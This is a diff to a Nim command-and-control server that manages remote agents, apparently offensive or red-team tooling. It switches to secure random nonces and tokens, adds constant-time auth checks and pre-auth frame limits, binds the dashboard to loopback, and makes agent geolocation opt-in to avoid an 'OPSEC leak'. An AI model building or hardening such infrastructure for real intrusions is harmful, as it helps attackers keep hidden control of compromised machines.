@@ -22,14 +22,16 @@ import std/[asyncdispatch, asyncnet, asynchttpserver, nativesockets, json, os, t
           base64, strutils, tables, locks, asyncfutures,
           sha1, monotimes, httpclient, uri, net]
 import std/[algorithm]
-import nimcrypto/[pbkdf2, sha2, hmac, utils, bcmode, rijndael]
+import nimcrypto/[pbkdf2, sha2, hmac, utils, bcmode, rijndael, sysrand]
 import winim/lean
 
-when staticExec("if exist xorkey.nim echo yes") == "yes":
-  include "xorkey.nim"
-else:
-  const XorKey: array[16, byte] = [byte 0x5A, 0xA5, 0x3C, 0xC3, 0x7E, 0xE7, 0x1F, 0xF1,
-                                              0x6B, 0xB6, 0x4D, 0xD4, 0x29, 0x92, 0x8A, 0xA8]
+# The build script regenerates a fresh 16-byte xorkey.nim before each
+# compile; there is no hardcoded fallback (a stale or wrong-length key
+# fails the build instead of silently encoding garbage secrets).
+include "xorkey.nim"
+static:
+  doAssert XorKey.len == 16,
+    "xorkey.nim must define a 16-byte XorKey for c2_server builds"
 
 proc encodeObf(s: string): seq[byte] =
   result = newSeq[byte](s.len)
@@ -46,7 +48,9 @@ when not defined(BuildPrefix):
 const
   LISTEN_HOST = "0.0.0.0"
   LISTEN_PORT = 8443
-  WEB_HOST = "0.0.0.0"
+  # Dashboard binds to loopback by default; expose it deliberately
+  # with -d:web_bind_all (operators normally front it with a tunnel).
+  WEB_HOST = when defined(web_bind_all): "0.0.0.0" else: "127.0.0.1"
   WEB_PORT = 8080
   # Dashboard WebSocket port (separate raw listener; asynchttpserver
   # is too aggressive about reusing HTTP/1.1 connections to safely
@@ -153,76 +157,94 @@ proc lookupGeo(ip: string): Future[GeoInfo] {.async, gcsafe.} =
   # Return cached entry if fresh, else hit ip-api.com and cache.
   # If lookup fails, return a GeoInfo with country="?" and don't
   # poison the cache (so transient errors auto-retry).
-  if ip.len == 0: return GeoInfo(country: "?")
-  let key = ipKey(ip)
-  # Cache hit?
-  var cached: GeoInfo
-  var hit = false
-  {.cast(gcsafe).}:
-    acquire(geoCacheLock)
-    if key in geoCache:
-      cached = geoCache[key]
-      hit = true
-    release(geoCacheLock)
-  if hit: return cached
-  # Skip private / loopback / link-local — no useful geo data and
-  # ip-api will refuse them anyway.
-  if key == "127.0.0.1" or key.startsWith("192.168.") or
-     key.startsWith("10.") or key.startsWith("172.16.") or
-     key.startsWith("172.17.") or key.startsWith("172.18.") or
-     key.startsWith("172.19.") or key.startsWith("172.2") or
-     key.startsWith("172.30.") or key.startsWith("172.31.") or
-     key == "::1" or key.startsWith("fe80:"):
-    let priv = GeoInfo(country: "private")
+  #
+  # OPT-IN: geo lookups send every agent's public IP to a third
+  # party (ip-api.com) over cleartext HTTP. That is an OPSEC leak by
+  # default, so the lookup only happens when the server is built
+  # with -d:geo_lookup. Without it, agents show country="local".
+  when not defined(geo_lookup):
+    if ip.len == 0:
+      return GeoInfo(country: "?")
+    let keyOff = ipKey(ip)
+    let priv = GeoInfo(country: "local")
     {.cast(gcsafe).}:
       acquire(geoCacheLock)
-      geoCache[key] = priv
+      geoCache[keyOff] = priv
       release(geoCacheLock)
-    return priv
-  try:
-    # ip-api.com HTTP endpoint. httpclient.get is blocking, so we
-    # run it in a worker thread and bridge back to the async
-    # dispatcher via a Future. createThread requires a {.nimcall.}
-    # proc that can't capture closures, so we pass the IP and
-    # result-future through a ref object as the thread argument.
-    type GeoJob = ref object
-      ip: string
-      fut: Future[GeoInfo]
-    let job = GeoJob(ip: key, fut: newFuture[GeoInfo]("geoip"))
-    proc worker(j: GeoJob) {.thread, nimcall.} =
-      try:
-        let client = newHttpClient(timeout = 5000)
-        let url = "http://ip-api.com/json/" & j.ip & "?fields=status,country,regionName,city,isp,org,timezone,query"
-        let body = client.getContent(url)
-        let parsed = parseJson(body)
-        if parsed["status"].getStr("") == "success":
-          let g = GeoInfo(
-            country: parsed["country"].getStr("?"),
-            region: parsed["regionName"].getStr("?"),
-            city: parsed["city"].getStr("?"),
-            isp: parsed["isp"].getStr("?"),
-            org: parsed["org"].getStr("?"),
-            timezone: parsed["timezone"].getStr("?")
-          )
-          j.fut.complete(g)
-        else:
-          j.fut.complete(GeoInfo(country: "?"))
-      except:
-        try: j.fut.complete(GeoInfo(country: "?"))
-        except: discard
-    var t: Thread[GeoJob]
-    createThread(t, worker, job)
-    let g = await job.fut
-    # Only cache real results; failure case ("?") we don't cache so
-    # a subsequent reconnect can re-attempt.
-    if g.country != "?":
+    result = priv
+  else:
+    if ip.len == 0:
+      return GeoInfo(country: "?")
+    let key = ipKey(ip)
+    # Cache hit?
+    var cached: GeoInfo
+    var hit = false
+    {.cast(gcsafe).}:
+      acquire(geoCacheLock)
+      if key in geoCache:
+        cached = geoCache[key]
+        hit = true
+      release(geoCacheLock)
+    if hit:
+      return cached
+    # Skip private / loopback / link-local — no useful geo data and
+    # ip-api will refuse them anyway.
+    if key == "127.0.0.1" or key.startsWith("192.168.") or
+       key.startsWith("10.") or key.startsWith("172.16.") or
+       key.startsWith("172.17.") or key.startsWith("172.18.") or
+       key.startsWith("172.19.") or key.startsWith("172.2") or
+       key.startsWith("172.30.") or key.startsWith("172.31.") or
+       key == "::1" or key.startsWith("fe80:"):
+      let priv = GeoInfo(country: "private")
       {.cast(gcsafe).}:
         acquire(geoCacheLock)
-        geoCache[key] = g
+        geoCache[key] = priv
         release(geoCacheLock)
-    return g
-  except:
-    return GeoInfo(country: "?")
+      return priv
+    try:
+      # ip-api.com HTTP endpoint. httpclient.get is blocking, so we
+      # run it in a worker thread and bridge back to the async
+      # dispatcher via a Future. createThread requires a {.nimcall.}
+      # proc that can't capture closures, so we pass the IP and
+      # result-future through a ref object as the thread argument.
+      type GeoJob = ref object
+        ip: string
+        fut: Future[GeoInfo]
+      let job = GeoJob(ip: key, fut: newFuture[GeoInfo]("geoip"))
+      proc worker(j: GeoJob) {.thread, nimcall.} =
+        try:
+          let client = newHttpClient(timeout = 5000)
+          let url = "http://ip-api.com/json/" & j.ip & "?fields=status,country,regionName,city,isp,org,timezone,query"
+          let body = client.getContent(url)
+          let parsed = parseJson(body)
+          if parsed["status"].getStr("") == "success":
+            let g = GeoInfo(
+              country: parsed["country"].getStr("?"),
+              region: parsed["regionName"].getStr("?"),
+              city: parsed["city"].getStr("?"),
+              isp: parsed["isp"].getStr("?"),
+              org: parsed["org"].getStr("?"),
+              timezone: parsed["timezone"].getStr("?")
+            )
+            j.fut.complete(g)
+          else:
+            j.fut.complete(GeoInfo(country: "?"))
+        except:
+          try: j.fut.complete(GeoInfo(country: "?"))
+          except: discard
+      var t: Thread[GeoJob]
+      createThread(t, worker, job)
+      let g = await job.fut
+      # Only cache real results; failure case ("?") we don't cache so
+      # a subsequent reconnect can re-attempt.
+      if g.country != "?":
+        {.cast(gcsafe).}:
+          acquire(geoCacheLock)
+          geoCache[key] = g
+          release(geoCacheLock)
+      return g
+    except:
+      return GeoInfo(country: "?")
 
 # Build a JSON object containing the remote address + resolved geo
 # fields, suitable for inclusion in agent list / state responses.
@@ -267,7 +289,7 @@ proc makeAad(agentId: string, dir: byte): seq[byte] =
 
 proc encryptFrame(s: AgentSession, plain: string): seq[byte] =
   var randBytes: array[8, byte]
-  for i in 0..<8: randBytes[i] = rand(255).byte
+  discard randomBytes(addr randBytes[0], 8)
   let nonce = makeNonce(s.sendCtr, randBytes)
   inc s.sendCtr
   let aad = makeAad(s.id, AAD_DIR_S2A)
@@ -509,6 +531,11 @@ proc pushAgentsUpdate() {.gcsafe.}
 # ------------------------------------------------------------
 # AGENT HANDLER
 # ------------------------------------------------------------
+# Unauthenticated clients can drive allocation sizing through frame
+# length. Cap pre-auth frames well below the post-auth 64 MB limit —
+# a legitimate registration message is a few KB at most.
+const MAX_PREAUTH_FRAME_BYTES = 64 * 1024
+
 proc handleAgent(client: AsyncSocket) {.async.} =
   if not await wsUpgrade(client): client.close(); return
   var agentId = ""
@@ -517,6 +544,7 @@ proc handleAgent(client: AsyncSocket) {.async.} =
   try:
     let raw = await client.recvWsFrame()
     if raw.len == 0: client.close(); return
+    if raw.len > MAX_PREAUTH_FRAME_BYTES: client.close(); return
 
     # First frame is registration: NOT encrypted yet (we need to derive
     # the session key first). We expect {p, h, an} in plaintext.
@@ -540,9 +568,11 @@ proc handleAgent(client: AsyncSocket) {.async.} =
     if ourAgentNonce.len != 16:
       client.close(); return
 
-    # Generate server nonce, derive session key
+    # Generate server nonce, derive session key. CSPRNG required:
+    # this nonce is mixed into the per-agent session key, so a
+    # predictable MT19937 stream would weaken every session.
     var sn: array[16, byte]
-    for i in 0..<16: sn[i] = rand(255).byte
+    discard randomBytes(addr sn[0], 16)
     let snHex = bytesToHex(sn)
 
     agentId = $rand(100000..999999) & $rand(100000..999999)
@@ -2020,13 +2050,25 @@ const WS_COOKIE_NAME = "sc2_sid"
 
 # Per-boot random session token. Set in main() after randomize().
 # The static "sentinel-dashboard-v1" value was forgeable by anyone
-# who read the binary — a per-boot 256-bit token is not.
+# who read the binary — a per-boot 256-bit CSPRNG token is not.
 var dashSessToken: string = ""
 
 proc newDashToken(): string =
+  # CSPRNG (nimcrypto sysrand), not the MT19937 `rand()` — the latter
+  # is predictable from a handful of observed outputs.
   var t: array[32, byte]
-  for i in 0..<32: t[i] = rand(255).byte
+  discard randomBytes(addr t[0], 32)
   bytesToHex(t)
+
+# Length-independent constant-time comparison for auth secrets.
+proc constTimeEq(a, b: string): bool =
+  let n = max(a.len, b.len)
+  var diff = uint8(a.len xor b.len)
+  for i in 0..<n:
+    let ca = if i < a.len: byte(ord(a[i])) else: 0'u8
+    let cb = if i < b.len: byte(ord(b[i])) else: 0'u8
+    diff = diff or (ca xor cb)
+  result = diff == 0
 
 proc checkAuth(req: Request): bool =
   # Validate Basic auth OR session cookie on every request. Cookie
@@ -2038,12 +2080,23 @@ proc checkAuth(req: Request): bool =
     let cred = auth[6..^1]
     let dec = base64.decode(cred)
     let parts = dec.split(':', 1)
-    if parts.len == 2 and parts[0] == WEB_AUTH_USER and parts[1] == WEB_AUTH_PASSWORD:
-      return true
+    {.cast(gcsafe).}:
+      if parts.len == 2 and constTimeEq(parts[0], WEB_AUTH_USER) and
+          constTimeEq(parts[1], WEB_AUTH_PASSWORD):
+        return true
   let cookie = req.headers.getOrDefault("Cookie")
   {.cast(gcsafe).}:
-    if dashSessToken.len > 0 and WS_COOKIE_NAME & "=" & dashSessToken in cookie:
-      return true
+    if dashSessToken.len > 0 and cookie.contains(WS_COOKIE_NAME & "="):
+      # Extract the cookie value and compare in constant time so a
+      # brute-forced token can't be timed byte-by-byte.
+      let prefix = WS_COOKIE_NAME & "="
+      let start = cookie.find(prefix) + prefix.len
+      var val = ""
+      var i = start
+      while i < cookie.len and cookie[i] != ';':
+        val.add(cookie[i]); inc i
+      if constTimeEq(val, dashSessToken):
+        return true
   return false
 
 proc requireAuth(req: Request) {.async, gcsafe.} =
